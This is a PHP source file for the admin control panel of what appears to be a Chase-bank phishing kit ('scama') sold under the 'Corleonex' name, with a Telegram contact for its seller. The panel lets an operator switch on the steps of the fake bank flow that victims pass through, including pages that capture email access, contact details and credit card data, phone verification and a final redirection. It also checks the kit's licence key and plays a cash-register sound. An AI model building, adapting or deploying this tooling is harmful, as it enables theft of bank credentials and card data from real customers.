<?php
error_reporting(0);
session_start();

header("Content-Type: text/html; charset=UTF-8");
#################### *-* Start Include *-* ####################
if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ include 'YOUR-CONFIG.php';}

if (isset($_GET['job'])) {
    
    // save new data 
        $user = $data->where( '_id', '=',  5 );

        $user->update( [
        'redirection' => $_POST['redirection'],
        'show_start_page' => $_POST['show_start_page'], 
        'show_email_access' => $_POST['show_email_access'], 
        'show_contact_information' => $_POST['show_contact_information'],
        'show_credit_card' => $_POST['show_credit_card'],
        'show_success_page' => $_POST['show_success_page'],
        'numverifier' => $_POST['numverifier'] ,
        'show_page_id' => $_POST['show_page_id']

        ] );
        header("Location: page.php");

}

/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

?>
<html lang="en">
  

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Corleonex Panel</title>

    <!-- CSS -->
    <!-- Bootstrap -->
    <!-- Ionicons -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="files/admin/css/ft.css">
    <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<script
  src="https://code.jquery.com/jquery-3.5.1.min.js"
  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
  crossorigin="anonymous"></script>

  </head>
<header>
<?php include('nav.php'); ?>
    </header>
 <!-- Begin page content -->
    <main role="main" class="container">
<div class="container">
    <div class="row">
       <div style="margin-top: 30px;" class="col-sm-2">
     

        </div>



        <div id="dayabli" style="margin-top: 30px;" class="col-sm-8">
<form method="post" action="page.php?job=page">



<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">redirection  </span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $redirection; ?>" name="redirection">
  
</div>



<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_start_page  </span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_start_page; ?>" name="show_start_page">
</div>

<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_email_access</span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_email_access; ?>" name="show_email_access">
  
</div>


<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_contact_information</span>
  <input   id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_contact_information; ?>" name="show_contact_information">
  
</div>


<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_credit_card </span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_credit_card; ?>" name="show_credit_card">
  
</div>


<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">Numverify on/off</span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $numverifier; ?>" name="numverifier">
  
</div>

<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_success_page </span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_success_page; ?>" name="show_success_page">
</div>


<div class="input-group ">
  <div class="input-group-prepend">
 <span class="btn btn-outline-success btn-block" id="basic-addon1">show_page_id </span>
  <input  id="inputall" type="text" class="form-control"  aria-describedby="basic-addon1" value="<?php echo $show_page_id; ?>" name="show_page_id">
</div>

</div>
  <button style="margin-top: 15px;" type="submit" class="btn btn-success">UPDATE</button>

</form>


        </div>
        <div style="margin-top: 30px;" class="col-sm-2">
       

  
  </div>


        </div>
    </div>
</div>
    </main>
    <audio id="audio" src="files/admin/cash-register-kaching-sound-effect-hd.mp3"></audio>

    <footer class="footer">
      <div class="container">
        <span class="text-muted">Smart Chase by <a target="_blank" href="http://t.me/corleonex" >Corleonex</a>.</span>
      </div>
    </footer>



<!-- Modal -->
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div style="    white-space: pre;      word-break: break-all;

" class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">Data : </h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div style="  word-break: break-all;
" id="lolfaker" class="modal-body">
        <!-- put the data --> 

        <!-- data --> 
      </div>
      <div class="modal-footer">
      </div>
    </div>
  </div>
</div>

<!-- Scripts -->
    <!-- jQuery -->   

    <!-- Bootstrap -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>    
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css
">

</script>

<script type="text/javascript">
  function check_api(){
      $.get('<?php echo $url; ?>/check.php?check=' + <?php echo $apikey; ?> , function(data){


         toastr.options = {
                "positionClass": "toast-bottom-right",

            }

        if (data == 'good' ) {

        toastr.success("your'e api key is correct :) ")

        } else {

        toastr.warning('Youre api key is wrong ! scama is not gonna work')


        }



  });

  }
</script>
  </body>

</html> 